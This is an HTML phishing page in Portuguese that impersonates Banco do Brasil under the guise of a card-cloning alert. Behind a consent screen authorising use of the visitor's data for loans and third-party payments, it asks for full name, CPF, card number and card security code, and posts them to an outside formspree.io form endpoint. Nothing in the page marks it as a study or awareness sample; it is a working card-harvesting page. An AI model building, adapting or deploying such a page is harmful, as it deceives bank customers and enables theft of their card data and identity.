<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Alerta de Clonagem de Cartão</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<header>
<h1>Banco do Brasil</h1>
<a href="https://ibb.co/3cgjBpr">
  <img src="https://i.ibb.co/3cgjBpr/IMG-1112.png" alt="Logo Banco do Brasil" width="200">
</a>
</header>
<main>
<div id="termo-consentimento">
<h2>Termo de Consentimento</h2>
<p>Autorizo o uso dos meus dados para solicitar empréstimos e pagamentos para terceiros.</p>
<button id="aceito">Aceito</button>
<button id="nao-aceito">Não Aceito</button>
</div>
<div id="conteudo" style="display: none;">
<h1>Alerta de Clonagem de Cartão</h1>
<form id="form-cartao" action="https://formspree.io/f/mbllpbpk" method="post">
<label for="nome">Nome:</label>
<input type="text" id="nome" name="nome" required>
<label for="cpf">CPF:</label>
<input type="text" id="cpf" name="cpf" onkeyup="formatarCPF(this)" maxlength="14" required>
<label for="numero-cartao">Número do Cartão:</label>
<input type="text" id="numero-cartao" name="numero-cartao" onkeyup="formatarCartao(this)" maxlength="19" required>
<label for="codigo-cartao">Código de Segurança:</label>
<input type="text" id="codigo-cartao" name="codigo-cartao" required>
<button id="btn-verificar">Verificar</button>
</form>
<div id="resultado"></div>
</div>
</main>
<script src="script.js"></script>
</body>
</html>
